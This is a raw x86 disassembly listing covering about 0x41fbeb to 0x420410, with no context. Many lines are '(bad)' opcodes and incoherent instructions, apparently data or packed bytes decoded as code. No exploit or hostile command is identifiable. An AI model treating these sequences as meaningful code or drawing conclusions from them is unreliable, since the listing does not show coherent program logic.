  41fbeb:	call   FWORD PTR [edx+0x2dffff1b]
  41fbf1:	adc    al,0x0
  41fbf3:	add    BYTE PTR [eax+0x2e0000f4],dl
  41fbf9:	test   BYTE PTR [ecx-0x3398967d],cl
  41fbff:	add    BYTE PTR [edx],cl
  41fc01:	mov    esp,0x20ccffff
  41fc06:	(bad)  
  41fc07:	inc    DWORD PTR [ebp-0x7cffff69]
  41fc0d:	(bad)  
  41fc0e:	(bad)  
  41fc0f:	push   DWORD PTR [ebp-0x67]
  41fc12:	mov    DWORD PTR [ecx-0x7c331c02],ecx
  41fc18:	mov    ebp,0x9ff8335
  41fc1d:	xchg   ebp,eax
  41fc1e:	(bad)  
  41fc1f:	push   DWORD PTR [ecx-0x1d33ffd9]
  41fc25:	je     0x41fc26
  41fc27:	int3   
  41fc28:	dec    ecx
  41fc29:	fdivp  st(7),st
  41fc2b:	add    ah,dh
  41fc2d:	dec    eax
  41fc2e:	add    BYTE PTR [eax],al
  41fc30:	push   ds
  41fc31:	fcos   
  41fc33:	add    BYTE PTR [ebp+0x53008355],bh
  41fc39:	mov    dh,0xff
  41fc3b:	jmp    DWORD PTR [eax]
  41fc3d:	imul   eax,DWORD PTR [ebx-0x7cb0f900],0x89d5e083
  41fc47:	call   FWORD PTR [eax+eax*1-0x1]
  41fc4b:	add    ch,bh
  41fc4d:	pop    ds
  41fc4e:	int3   
  41fc4f:	inc    DWORD PTR [esi-0x7500ffa7]
  41fc55:	jmp    0x8389:0x554700ff
  41fc5c:	jle    0x41fc48
  41fc5e:	(bad)  
  41fc5f:	(bad)  
  41fc60:	fisubr DWORD PTR [eax-0x1]
  41fc63:	add    BYTE PTR [eax-0x3a007ca8],al
  41fc69:	cmc    
  41fc6a:	add    BYTE PTR [eax],al
  41fc6c:	call   0x59:0xe8000004
  41fc73:	cmp    DWORD PTR [esi+0x78],0xffffffff
  41fc77:	(bad)  
  41fc78:	jmp    0x41fc66
  41fc7a:	add    BYTE PTR [eax],al
  41fc7c:	dec    esi
  41fc7d:	or     edi,edi
  41fc7f:	or     DWORD PTR [ecx-0x47ff76f7],0x1e
  41fc86:	add    BYTE PTR [ebx-0x7cff9252],al
  41fc8c:	add    dh,BYTE PTR [ecx]
  41fc8e:	(bad)  
  41fc8f:	(bad)  
  41fc90:	jmp    0xff7f:0x75ffff94
  41fc97:	call   DWORD PTR [eax+0x57]
  41fc9a:	int3   
  41fc9b:	push   DWORD PTR [esi-0x2a760069]
  41fca1:	out    dx,al
  41fca2:	int3   
  41fca3:	(bad)  
  41fca4:	call   FWORD PTR [ecx-0x1]
  41fca7:	int3   
  41fca8:	jne    0x41fcec
  41fcaa:	inc    DWORD PTR [ebx-0x7c334f9a]
  41fcb0:	xchg   BYTE PTR [eax-0x14b2ff01],ch
  41fcb6:	(bad)  
  41fcb7:	jmp    DWORD PTR [edi]
  41fcb9:	mov    DWORD PTR [ebx-0x6f9701],0xf208ff
  41fcc3:	int3   
  41fcc4:	retf   
  41fcc5:	cdq    
  41fcc6:	mov    DWORD PTR [ebx+0xffaabb],eax
  41fccc:	retf   
  41fccd:	jmp    0xb329fcd1
  41fcd2:	(bad)  
  41fcd3:	inc    DWORD PTR ds:0xf7ffff80
  41fcd9:	adc    DWORD PTR [ebx+0xd23c83],eax
  41fcdf:	add    BYTE PTR [ebx],dh
  41fce1:	mov    ebp,0xd4ccc83
  41fce6:	inc    DWORD PTR [eax]
  41fce8:	test   DWORD PTR [ecx+0x0],0x5f6eff
  41fcef:	inc    edi
  41fcf1:	cmp    eax,DWORD PTR [eax]
  41fcf3:	cmp    ebx,0x71
  41fcf6:	mov    edi,edi
  41fcf8:	add    al,0x5b
  41fcfa:	inc    DWORD PTR [eax]
  41fcfc:	pop    ss
  41fcfd:	pop    ecx
  41fcfe:	inc    DWORD PTR [eax]
  41fd00:	pop    ebp
  41fd01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd02:	add    BYTE PTR [ebx-0x337c1445],al
  41fd08:	fst    st(5)
  41fd0a:	add    BYTE PTR [ecx-0x7cbabd],cl
  41fd10:	jmp    0x41fcec
  41fd12:	(bad)  
  41fd13:	jmp    FWORD PTR [esi]
  41fd15:	jl     0x41fce3
  41fd17:	mov    DWORD PTR [edi],edx
  41fd19:	ror    BYTE PTR [ecx+0x4d5b83],0x89
  41fd20:	jne    0x41fd66
  41fd22:	add    bh,bh
  41fd24:	pop    ebp
  41fd25:	(bad)  
  41fd26:	int3   
  41fd27:	push   ecx
  41fd29:	add    al,0x0
  41fd2b:	add    al,ch
  41fd2d:	xor    edi,edi
  41fd2f:	inc    DWORD PTR [ebp+edx*2+0x230f8900]
  41fd36:	add    BYTE PTR [eax],al
  41fd38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd39:	dec    ebp
  41fd3a:	int3   
  41fd3b:	push   DWORD PTR [edi+0xff00c8]
  41fd41:	push   ebp
  41fd42:	add    bh,bh
  41fd44:	mov    eax,es
  41fd46:	add    DWORD PTR [eax],0x41
  41fd49:	pushf  
  41fd4a:	add    BYTE PTR [eax],al
  41fd4c:	rol    BYTE PTR [edi-0x34],0xff
  41fd50:	sub    ch,ch
  41fd52:	add    bh,bh
  41fd54:	mov    edi,0x5affff22
  41fd59:	mov    eax,0x18a40083
  41fd5e:	inc    DWORD PTR [eax]
  41fd60:	inc    ebx
  41fd61:	push   cs
  41fd62:	mov    edi,edi
  41fd64:	clc    
  41fd65:	pop    ss
  41fd66:	add    bh,bh
  41fd68:	stc    
  41fd69:	inc    ebx
  41fd6a:	(bad)  
  41fd6b:	push   DWORD PTR [edi+eiz*1+0x2b8affff]
  41fd72:	inc    DWORD PTR [ebx+0x835d8e]
  41fd78:	sbb    DWORD PTR [edx],esp
  41fd7a:	inc    DWORD PTR [ebx-0xcb27]
  41fd80:	mov    bl,0x11
  41fd82:	add    BYTE PTR [eax],al
  41fd84:	fs inc ecx
  41fd86:	(bad)  
  41fd87:	inc    esp
  41fd89:	push   cs
  41fd8a:	(bad)  
  41fd8b:	dec    DWORD PTR [edi]
  41fd8d:	out    0x0,eax
  41fd8f:	push   DWORD PTR [ebp+0x36]
  41fd92:	cmp    edi,0x63
  41fd95:	cwde   
  41fd96:	inc    DWORD PTR [eax]
  41fd98:	lahf   
  41fd99:	add    BYTE PTR [ebx+0xe4accc],0x0
  41fda0:	adc    ecx,ebx
  41fda2:	add    bh,bh
  41fda4:	xor    eax,0xfff008d
  41fda9:	dec    edx
  41fdaa:	inc    DWORD PTR [eax]
  41fdac:	jle    0x41fd95
  41fdae:	dec    esp
  41fdb0:	jno    0x41fd63
  41fdb2:	add    DWORD PTR [eax],0x34
  41fdb5:	fadd   DWORD PTR [eax]
  41fdb7:	dec    ebp
  41fdb9:	rol    BYTE PTR [eax],0x83
  41fdbc:	add    eax,0xd5ffff34
  41fdc1:	lock inc DWORD PTR [eax]
  41fdc4:	add    cl,BYTE PTR [ebp-0x1]
  41fdc7:	add    BYTE PTR [ebp+0x1bff004c],dh
  41fdcd:	or     BYTE PTR [eax],al
  41fdcf:	mov    DWORD PTR [ebx-0x3e],ecx
  41fdd2:	mov    esp,ecx
  41fdd4:	sbb    DWORD PTR [edi+0xa450083],ecx
  41fdda:	inc    DWORD PTR [eax]
  41fddc:	cs cmp bh,0x83
  41fde0:	or     al,0x7
  41fde2:	add    BYTE PTR [ebx-0xa414],al
  41fde8:	sub    ecx,ecx
  41fdea:	add    BYTE PTR [ecx-0xffe03c],cl
  41fdf0:	icebp  
  41fdf1:	mov    bh,0xff
  41fdf3:	add    BYTE PTR [edx-0x42ff00a9],al
  41fdf9:	dec    esp
  41fdfa:	add    BYTE PTR [ebx-0xff933c],al
  41fe00:	mov    dh,0xe8
  41fe02:	mov    DWORD PTR [ebx-0x7c002886],eax
  41fe08:	xchg   BYTE PTR [edi-0x2dc10001],dl
  41fe0e:	cmp    edi,0x16
  41fe11:	cmp    al,0x0
  41fe13:	inc    ebp
  41fe15:	or     eax,0x7e880000
  41fe1a:	inc    DWORD PTR [eax]
  41fe1c:	pop    ds
  41fe1d:	add    bh,bh
  41fe1f:	(bad)  
  41fe20:	mov    BYTE PTR ds:[eax],0x89
  41fe24:	jnp    0x41fdd4
  41fe26:	inc    DWORD PTR [ebx+0xffa1ca]
  41fe2c:	or     edi,ecx
  41fe2e:	inc    DWORD PTR [eax]
  41fe30:	mov    bh,0xb4
  41fe32:	add    DWORD PTR [eax],0xffffff8b
  41fe35:	into   
  41fe36:	mov    edi,edi
  41fe38:	or     ebp,DWORD PTR [eax]
  41fe3a:	inc    DWORD PTR [eax]
  41fe3c:	rol    DWORD PTR [ebp-0x1],1
  41fe3f:	push   DWORD PTR [esi+0x6d83ff5a]
  41fe45:	test   bh,bh
  41fe47:	add    BYTE PTR [edi+0x19],al
  41fe4a:	dec    DWORD PTR [ecx-0x7c00ef82]
  41fe50:	clc    
  41fe51:	mov    ebp,0x7ffeffff
  41fe56:	add    BYTE PTR [ecx-0x2383],cl
  41fe5c:	data16 aaa 
  41fe5e:	add    ah,cl
  41fe60:	rcr    DWORD PTR [eax-0x2d700077],1
  41fe66:	(bad)  
  41fe67:	jmp    FWORD PTR [edx]
  41fe69:	pop    edi
  41fe6a:	inc    DWORD PTR [eax]
  41fe6c:	(bad)  
  41fe6d:	add    DWORD PTR gs:[eax],0x65
  41fe71:	sbb    eax,DWORD PTR [eax]
  41fe73:	inc    DWORD PTR [ebx-0x64ff3396]
  41fe79:	or     DWORD PTR [ebx-0xa5307d],eax
  41fe7f:	call   DWORD PTR ds:0x88ffff9f
  41fe85:	mov    ?,edi
  41fe87:	add    BYTE PTR [eax-0x5e],ch
  41fe8a:	int3   
  41fe8b:	add    BYTE PTR [edx+0x6583834b],al
  41fe91:	sar    edi,0x89
  41fe94:	push   ecx
  41fe95:	or     edi,edi
  41fe97:	add    BYTE PTR [ebx-0x4b],dh
  41fe9a:	mov    DWORD PTR [ebx+0xff58a8],eax
  41fea0:	jmp    0xffa2:0x3783007c
  41fea7:	add    BYTE PTR [esi+0x15],ch
  41feaa:	(bad)  
  41feab:	(bad)  
  41feac:	jg     0x41fe6d
  41feae:	add    bh,bh
  41feb0:	and    BYTE PTR [esi-0x34],dh
  41feb3:	add    BYTE PTR [edx-0x78],ch
  41feb6:	(bad)  
  41feb7:	push   edi
  41feb9:	aad    0xff
  41febb:	call   eax
  41febd:	xor    eax,0x7aafff83
  41fec2:	add    bh,bh
  41fec4:	adc    al,0x40
  41fec6:	add    bh,bh
  41fec8:	adc    ch,BYTE PTR [edi-0x7d]
  41fecb:	or     DWORD PTR [edi+0xc],0x0
  41fecf:	call   DWORD PTR [ebp-0x48]
  41fed2:	add    BYTE PTR [eax],al
  41fed4:	xlat   BYTE PTR ds:[ebx]
  41fed5:	add    bh,bh
  41fed7:	int3   
  41fed8:	mov    dh,0xcc
  41feda:	inc    DWORD PTR [eax]
  41fedc:	xor    cl,BYTE PTR [eax+0x0]
  41fedf:	add    BYTE PTR [ebx+0xd],dh
  41fee2:	inc    DWORD PTR [eax]
  41fee4:	fwait
  41fee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fee6:	add    BYTE PTR [eax],al
  41fee8:	popa   
  41fee9:	inc    WORD PTR [eax]
  41feec:	inc    esi
  41feed:	call   0x6b6cfef1
  41fef2:	(bad)  
  41fef3:	inc    edx
  41fef5:	aaa    
  41fef6:	cmp    edi,0x5a
  41fef9:	jnp    0x41fe7e
  41fefb:	add    BYTE PTR [eax+0x21000041],ah
  41ff01:	(bad)  
  41ff03:	mov    esi,esi
  41ff05:	(bad)  
  41ff08:	cli    
  41ff09:	pop    esp
  41ff0a:	add    BYTE PTR [ebx+0xff41ee],al
  41ff10:	call   0x3540ffcd
  41ff15:	popa   
  41ff16:	(bad)  
  41ff17:	call   edi
  41ff19:	cmp    cl,ah
  41ff1b:	mov    ebp,edi
  41ff1d:	xchg   esp,eax
  41ff1e:	add    ah,cl
  41ff20:	xor    DWORD PTR [edx-0x7d],ebp
  41ff23:	int3   
  41ff24:	fdivr  QWORD PTR [ebp+0x556affff]
  41ff2a:	cmp    edi,0xffffffb1
  41ff2d:	mov    bl,0xcc
  41ff2f:	inc    DWORD PTR [ecx+0x5700ffd2]
  41ff35:	mov    cs,WORD PTR [ecx-0xc38201]
  41ff3b:	dec    DWORD PTR [esi]
  41ff3d:	std    
  41ff3e:	mov    DWORD PTR [eax],eax
  41ff40:	jnp    0x41ff25
  41ff42:	add    BYTE PTR [eax],al
  41ff44:	sub    BYTE PTR [ebx-0x2ac0ff34],0x83
  41ff4b:	(bad)  
  41ff4c:	jle    0x41ff44
  41ff4e:	add    DWORD PTR [eax],0xffffffbf
  41ff51:	lahf   
  41ff52:	add    BYTE PTR [ebx-0x450e],al
  41ff58:	push   esp
  41ff59:	mov    ecx,0xd3bfffff
  41ff5e:	inc    DWORD PTR [eax]
  41ff60:	mov    ah,0x38
  41ff62:	(bad)  
  41ff63:	inc    DWORD PTR [edi+esi*4+0x0]
  41ff67:	call   DWORD PTR [edi]
  41ff69:	dec    edi
  41ff6a:	add    bh,bh
  41ff6c:	inc    edx
  41ff6d:	mov    eax,0xcbe289ff
  41ff72:	add    bh,bh
  41ff74:	sar    BYTE PTR [eax-0x1],1
  41ff77:	(bad)  
  41ff78:	jmp    0x41ff24
  41ff7a:	add    DWORD PTR [eax],0xffffff9f
  41ff7d:	push   eax
  41ff7e:	(bad)  
  41ff7f:	inc    ebp
  41ff81:	cmp    edi,edi
  41ff83:	inc    DWORD PTR [ebx+0x37ffff51]
  41ff89:	pushf  
  41ff8a:	add    BYTE PTR [ecx-0xc4ea],cl
  41ff90:	imul   ebx,DWORD PTR [ebp-0x1],0xff1e0483
  41ff97:	jmp    DWORD PTR [eax+0xdff00a0]
  41ff9d:	xchg   ecx,eax
  41ff9e:	inc    DWORD PTR [eax]
  41ffa0:	pop    es
  41ffa1:	test   BYTE PTR [eax],al
  41ffa3:	dec    eax
  41ffa5:	rol    DWORD PTR [eax],0x0
  41ffa8:	push   0x95838311
  41ffad:	mov    ch,0xff
  41ffaf:	call   FWORD PTR [ecx-0x4fff7c9a]
  41ffb5:	mov    ch,0xff
  41ffb7:	jmp    esp
  41ffb9:	inc    eax
  41ffba:	add    DWORD PTR [eax],0x57
  41ffbd:	stos   DWORD PTR es:[edi],eax
  41ffbe:	inc    DWORD PTR [eax]
  41ffc0:	and    DWORD PTR [ebx+0x150eff00],edi
  41ffc6:	inc    DWORD PTR [eax]
  41ffc8:	mov    al,ds:0x18ffff56
  41ffcd:	addr16 (bad) 
  41ffcf:	jmp    FWORD PTR [ecx-0x69]
  41ffd2:	(bad)  
  41ffd3:	call   FWORD PTR [ebx+0x440083f6]
  41ffd9:	repz inc DWORD PTR [eax]
  41ffdc:	sbb    DWORD PTR [ecx],esi
  41ffde:	(bad)  
  41ffdf:	push   DWORD PTR [ebx-0x76]
  41ffe2:	inc    DWORD PTR [eax]
  41ffe4:	pop    ss
  41ffe5:	pop    edi
  41ffe6:	(bad)  
  41ffe7:	jmp    FWORD PTR [ecx+0x54]
  41ffea:	inc    DWORD PTR [ebx-0xff6af1]
  41fff0:	popa   
  41fff1:	sbb    eax,0xe0deff00
  41fff6:	(bad)  
  41fff7:	jmp    FWORD PTR [esi+0x7d]
  41fffa:	add    BYTE PTR [ecx+0xcc6508],cl
  420000:	test   bh,ah
  420002:	add    BYTE PTR [eax],al
  420004:	es lahf 
  420006:	int3   
  420007:	sbb    DWORD PTR [ecx-0x22330095],0x53
  42000e:	(bad)  
  42000f:	jmp    esp
  420011:	inc    edi
  420012:	dec    DWORD PTR [ecx-0x7600a358]
  420018:	into   
  420019:	data16 add bh,bh
  42001c:	(bad)
  42001f:	add    BYTE PTR [edi-0x3],dh
  420022:	(bad)  
  420023:	jmp    FWORD PTR [esi-0x28]
  420026:	inc    DWORD PTR [ebx-0x8d8]
  42002c:	mov    bh,0xce
  42002e:	inc    DWORD PTR [eax]
  420030:	xchg   ebx,eax
  420031:	pop    es
  420032:	add    bh,bh
  420034:	xchg   edx,eax
  420035:	inc    DWORD PTR [eax]
  420037:	(bad)  
  420038:	out    dx,eax
  420039:	inc    ebx
  42003a:	inc    DWORD PTR [ebx+0xffaa13]
  420040:	mov    al,0xa
  420042:	cmp    edi,0xffffffb8
  420045:	jmp    0x2b8600cd
  42004a:	inc    DWORD PTR [eax]
  42004c:	sbb    DWORD PTR [esp+ecx*8-0x3390a100],eax
  420053:	push   DWORD PTR [ebp+0x7b]
  420056:	add    BYTE PTR [eax],al
  420058:	popf   
  420059:	pop    ecx
  42005a:	int3   
  42005b:	sbb    DWORD PTR [eax],0xffffff89
  42005e:	add    DWORD PTR [eax],0xffffff8e
  420061:	dec    eax
  420062:	inc    DWORD PTR [eax]
  420064:	lea    ebx,[esi]
  420066:	(bad)  
  420067:	inc    edi
  420069:	aas    
  42006a:	cmp    edi,0xfffffff3
  42006d:	mov    ds:0x814783ff,eax
  420072:	dec    esp
  420074:	popf   
  420075:	fld    QWORD PTR [ebx-0xf18c00]
  42007b:	int3   
  42007c:	out    0xa6,al
  42007e:	inc    DWORD PTR [eax]
  420080:	dec    edx
  420081:	push   ebp
  420082:	(bad)  
  420083:	call   FWORD PTR [edx]
  420085:	ins    BYTE PTR es:[edi],dx
  420086:	(bad)  
  420087:	dec    DWORD PTR [edi+0x23008337]
  42008d:	leave  
  42008e:	inc    DWORD PTR [eax]
  420090:	fist   DWORD PTR [ecx+ecx*4+0x0]
  420094:	xlat   BYTE PTR ds:[ebx]
  420095:	mov    cl,0xcc
  420097:	sbb    ecx,0x27
  42009a:	(bad)  
  42009b:	jmp    DWORD PTR ds:0x8cffff4a
  4200a1:	push   ecx
  4200a2:	add    bh,bh
  4200a4:	into   
  4200a5:	ud0    eax,DWORD PTR [eax]
  4200a8:	xor    al,0x5d
  4200aa:	add    bh,bh
  4200ac:	jg     0x420084
  4200ae:	add    BYTE PTR [ecx-0x33272c],cl
  4200b4:	ds xor bh,bh
  4200b7:	call   DWORD PTR [ebx-0x79ffff35]
  4200bd:	int3   
  4200be:	add    BYTE PTR [eax],al
  4200c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200c1:	xor    edi,edi
  4200c3:	mov    DWORD PTR [edx+ebx*8-0x1],eax
  4200c7:	(bad)  
  4200c8:	fcomp  QWORD PTR [ebx-0x7d]
  4200cb:	jmp    FWORD PTR [ebp+0x1affff53]
  4200d1:	lahf   
  4200d2:	add    DWORD PTR [ebx-0x7cff384b],0x5a
  4200d9:	add    al,0x0
  4200db:	add    BYTE PTR [ebp-0x3a],dh
  4200de:	(bad)  
  4200df:	push   DWORD PTR [edi+0x48]
  4200e2:	add    BYTE PTR [eax],al
  4200e4:	add    eax,0x2900cc46
  4200e9:	(bad)  
  4200ea:	dec    DWORD PTR [ecx+0xff847c]
  4200f0:	mov    ch,0x30
  4200f2:	mov    DWORD PTR [ebx-0x767ce9],eax
  4200f8:	cwde   
  4200f9:	add    eax,0x86868300
  4200fe:	(bad)  
  4200ff:	dec    DWORD PTR [edi+0x1aff005d]
  420105:	fisttp QWORD PTR [ecx+0xdbafff]
  42010b:	add    BYTE PTR [ecx],dl
  42010d:	imul   edi,edi,0x89acdf00
  420113:	push   DWORD PTR [esi-0x44]
  420116:	add    bh,bh
  420118:	xlat   BYTE PTR ds:[ebx]
  420119:	into   
  42011a:	mov    DWORD PTR [ecx-0xdaa],ecx
  420120:	cs mov edi,edi
  420123:	add    BYTE PTR [ebp-0x60ffff1e],ah
  420129:	dec    ebp
  42012a:	add    BYTE PTR [eax],al
  42012c:	call   0x21:0xda0083c4
  420133:	int3   
  420134:	shr    BYTE PTR [edi],cl
  420136:	mov    edi,edi
  420138:	xor    eax,0xed00ff94
  42013d:	sar    edi,0x0
  420140:	dec    ecx
  420141:	cmc    
  420142:	(bad)  
  420143:	push   DWORD PTR [ecx-0x4d7600fe]
  420149:	cmp    edi,0xffb22589
  42014f:	add    BYTE PTR [edi-0x60],bl
  420152:	add    bh,bh
  420154:	push   ds
  420155:	inc    edi
  420156:	add    BYTE PTR [ecx-0x7cc8b3],cl
  42015c:	fdivr  DWORD PTR [ecx]
  42015e:	(bad)  
  42015f:	call   FWORD PTR [esi+0x2200ff28]
  420165:	xlat   BYTE PTR ds:[ebx]
  420166:	dec    DWORD PTR [ecx-0x7cff9f6a]
  42016c:	xchg   edi,eax
  42016d:	push   cs
  42016e:	cmp    edi,0x64
  420171:	xchg   bh,bh
  420173:	add    dl,bh
  420175:	fwait
  420176:	dec    esp
  420178:	add    BYTE PTR [eax-0x1],ch
  42017b:	int3   
  42017c:	and    DWORD PTR [esi],0x4b120089
  420182:	inc    DWORD PTR [eax]
  420184:	pushf  
  420185:	idiv   edi
  420187:	push   DWORD PTR [edi+0x3400ff31]
  42018d:	push   0x89ff83
  420192:	add    DWORD PTR [ebx-0xa2c6],0x40
  420199:	xor    edi,edi
  42019b:	add    dh,ah
  42019d:	add    BYTE PTR gs:[eax],al
  4201a0:	adc    bh,BYTE PTR [edi+edi*8-0x34]
  4201a4:	xchg   DWORD PTR [eax-0x1],ebp
  4201a7:	add    bl,al
  4201a9:	icebp  
  4201aa:	add    BYTE PTR [ebx-0xff3292],al
  4201b0:	sbb    BYTE PTR [ecx-0x1],bl
  4201b3:	add    BYTE PTR [eax+0x4600ff69],bh
  4201b9:	lea    eax,[ebx-0x763a9f77]
  4201bf:	call   FWORD PTR [ebx-0x340000f3]
  4201c5:	repz add bh,bh
  4201c8:	lods   eax,DWORD PTR ds:[esi]
  4201c9:	mov    bh,bh
  4201cb:	add    BYTE PTR [edi],bh
  4201cd:	cmp    edi,edi
  4201cf:	inc    ebp
  4201d1:	fwait
  4201d2:	(bad)  
  4201d3:	(bad)  
  4201d4:	sti    
  4201d5:	loop   0x4201d6
  4201d7:	jmp    FWORD PTR [ecx+0x6]
  4201da:	add    BYTE PTR [eax],al
  4201dc:	xor    BYTE PTR [eax-0x5e4b007d],dh
  4201e2:	mov    DWORD PTR [ecx-0x7cffb57b],ecx
  4201e8:	frstor [ebx+0x18bbffff]
  4201ee:	inc    DWORD PTR [ebx+0xff503d]
  4201f4:	jnp    0x420266
  4201f6:	add    BYTE PTR [ecx+0x89f5f5],cl
  4201fc:	mov    BYTE PTR [eax+eax*1-0x1],dh
  420200:	ror    edi,cl
  420202:	inc    DWORD PTR [ebx+0xff9ce4]
  420208:	enter  0xff37,0x83
  42020c:	sti    
  42020d:	rol    BYTE PTR [eax],1
  42020f:	xor    edi,0x48
  420212:	(bad)  
  420213:	jmp    FWORD PTR [ecx+0x61ff000a]
  420219:	fwait
  42021a:	add    DWORD PTR [ebx-0x767cca59],0xfffffff9
  420221:	sub    eax,DWORD PTR [eax]
  420223:	dec    DWORD PTR [ebx-0x52767caf]
  420229:	idiv   bh
  42022b:	(bad)  
  42022c:	fneni(8087 only) 
  42022e:	or     DWORD PTR [ecx+0xcce0e1],0xffffffa0
  420235:	jb     0x420236
  420237:	add    BYTE PTR ds:0x99ffff8c,al
  42023d:	pop    ecx
  42023e:	dec    esp
  420240:	jno    0x4201cf
  420242:	inc    DWORD PTR [eax]
  420244:	repz xchg ebp,eax
  420246:	mov    DWORD PTR [eax],eax
  420248:	jne    0x42023e
  42024a:	(bad)  
  42024b:	(bad)  
  42024c:	cld    
  42024d:	dec    eax
  42024e:	add    BYTE PTR [ebx-0x661a],al
  420254:	mov    WORD PTR [edx],es
  420256:	int3   
  420257:	jmp    FWORD PTR [edi+0x66ffccbf]
  42025d:	fdivr  st,st(7)
  42025f:	add    BYTE PTR [eax+esi*4],bl
  420262:	add    BYTE PTR [ebx-0xff8205],al
  420268:	sub    BYTE PTR [eax],0x0
  42026b:	add    BYTE PTR [esp+ebp*1-0x34],dl
  42026f:	dec    DWORD PTR [ebx+0x27ffff9b]
  420275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420276:	(bad)  
  420277:	call   DWORD PTR [eax]
  420279:	mov    ah,0x0
  42027b:	add    BYTE PTR [ecx-0x4b007651],cl
  420281:	inc    eax
  420282:	add    DWORD PTR [eax],0xffffffd5
  420285:	xchg   edi,edi
  420287:	jmp    DWORD PTR [esi+0x16ffff83]
  42028d:	mov    eax,DWORD PTR [eax]
  42028f:	jmp    FWORD PTR [edi-0x28000011]
  420295:	pop    eax
  420296:	add    BYTE PTR [eax],al
  420298:	pushf  
  420299:	repz add bh,bh
  42029c:	pop    es
  42029d:	add    edi,edi
  42029f:	add    BYTE PTR [ebx+0xbffccd5],cl
  4202a5:	(bad)  
  4202a7:	add    BYTE PTR [ebx+0x48],dl
  4202aa:	or     DWORD PTR [ecx+0xff5cec],0x64
  4202b1:	push   cs
  4202b2:	add    BYTE PTR [eax],al
  4202b4:	cmp    al,0xdb
  4202b6:	add    bh,bh
  4202b8:	adc    al,0x76
  4202ba:	inc    DWORD PTR [ebx+0xc15c]
  4202c0:	int    0xb5
  4202c2:	inc    DWORD PTR [eax]
  4202c4:	(bad)  
  4202c5:	xchg   edi,eax
  4202c6:	(bad)  
  4202c7:	call   FWORD PTR [esp+edi*4]
  4202ca:	(bad)  
  4202cb:	call   DWORD PTR [edi-0x50]
  4202ce:	(bad)  
  4202cf:	call   DWORD PTR ds:0x76ff0092
  4202d5:	pop    ds
  4202d6:	add    bh,bh
  4202d8:	pop    edi
  4202d9:	push   esi
  4202da:	add    BYTE PTR [eax],al
  4202dc:	mov    bl,0x66
  4202de:	add    bh,bh
  4202e0:	jecxz  0x4202ed
  4202e2:	int3   
  4202e3:	jmp    FWORD PTR [ebx+0x5283896f]
  4202e9:	and    eax,0x8e268389
  4202ee:	add    bh,bh
  4202f0:	stos   BYTE PTR es:[edi],al
  4202f1:	rol    DWORD PTR [eax],0xff
  4202f4:	inc    ebp
  4202f5:	cmc    
  4202f6:	add    bh,bh
  4202f8:	adc    BYTE PTR [edi+edi*8-0x77],cl
  4202fc:	test   BYTE PTR [eax],0x0
  4202ff:	add    BYTE PTR [eax],cl
  420301:	aam    0x89
  420303:	add    BYTE PTR [eax-0xa],ah
  420306:	cmp    edi,0xffffff8d
  420309:	mov    ecx,0x9c1ff00
  42030e:	(bad)  
  42030f:	push   DWORD PTR [ebp-0x1d]
  420312:	mov    DWORD PTR [eax],eax
  420314:	jno    0x42036d
  420316:	inc    DWORD PTR [ebx-0x76ff067e]
  42031c:	je     0x4202c8
  42031e:	(bad)  
  42031f:	jmp    DWORD PTR [esi+0x4983ff5d]
  420325:	pushf  
  420326:	dec    DWORD PTR [ecx+0x9fd1]
  42032c:	pop    ecx
  42032d:	fmulp  st(4),st
  42032f:	push   esi
  420331:	ja     0x420332
  420333:	and    DWORD PTR [edi],0x5b
  420336:	add    BYTE PTR [ecx+0x8956a0],cl
  42033c:	jg     0x420395
  42033e:	inc    DWORD PTR [eax]
  420340:	mov    bh,0xdc
  420342:	dec    DWORD PTR [ecx-0xd568]
  420348:	out    0xb0,eax
  42034a:	dec    esp
  42034c:	lods   al,BYTE PTR ds:[esi]
  42034d:	sub    al,0xcc
  42034f:	add    BYTE PTR [edi],ah
  420351:	test   eax,0x39ca0000
  420356:	mov    DWORD PTR [eax],eax
  420358:	sbb    eax,0x3ff003d
  42035d:	or     edi,edi
  42035f:	push   DWORD PTR [ebx+0x36ff002a]
  420365:	dec    ebx
  420366:	add    bh,bh
  420368:	inc    esi
  420369:	dec    ebx
  42036a:	add    DWORD PTR [ebx-0xa7b9],0x77
  420371:	mov    ebp,0x93300ff
  420376:	(bad)  
  420377:	(bad)  
  420378:	fidivr WORD PTR [ebp+0x0]
  42037b:	add    BYTE PTR [eax+0x20],ah
  42037e:	add    DWORD PTR [eax],0x3d
  420381:	sub    al,0xcc
  420383:	(bad)  
  420384:	sti    
  420385:	jbe    0x420386
  420387:	or     DWORD PTR [edi-0x28003328],0x79
  42038e:	(bad)  
  42038f:	jmp    FWORD PTR [ecx+0x51]
  420392:	dec    esp
  420394:	xor    ah,BYTE PTR [edi+edi*8]
  420397:	add    BYTE PTR [ecx+0x12],dl
  42039a:	add    bh,bh
  42039c:	(bad)  
  42039d:	mov    ch,0xff
  42039f:	push   DWORD PTR [ebx+0x6000ffc5]
  4203a5:	xchg   esi,eax
  4203a6:	add    BYTE PTR [ecx+0xd98a],cl
  4203ac:	mov    edx,0x6400ffaf
  4203b1:	sbb    BYTE PTR [eax],al
  4203b3:	cmp    DWORD PTR [edx],0xffffffba
  4203b6:	int3   
  4203b7:	add    BYTE PTR [ecx+0x4f],cl
  4203ba:	inc    DWORD PTR [ebx-0xff2fd9]
  4203c0:	adc    al,0xff
  4203c2:	int3   
  4203c3:	inc    DWORD PTR [ebx+0xff63]
  4203c9:	inc    edx
  4203ca:	add    BYTE PTR [ebx-0x214],al
  4203d0:	mov    ds:0x9600cc67,eax
  4203d5:	mov    DWORD PTR [ebx-0xc7801],eax
  4203db:	int3   
  4203dc:	sub    eax,0x4fffff21
  4203e1:	sti    
  4203e2:	add    BYTE PTR [eax],al
  4203e4:	sahf   
  4203e5:	dec    esi
  4203e6:	dec    DWORD PTR [ecx+0x8312ed]
  4203ec:	iret   
  4203ed:	scas   al,BYTE PTR es:[edi]
  4203ee:	add    DWORD PTR [eax],0xa
  4203f1:	loope  0x4203bf
  4203f3:	int3   
  4203f4:	ficom  DWORD PTR [edi-0x1]
  4203f7:	sub    DWORD PTR [edx+0xcffcccd],0xffffff9e
  4203fe:	inc    DWORD PTR [eax]
  420400:	sub    DWORD PTR ds:0xb29600ff,ecx
  420406:	cmp    edi,0xffffffa5
  420409:	mov    ds:0x4769ffff,al
  42040e:	dec    esp
  420410:	xor    eax,DWORD PTR ds:0x3a5dff00
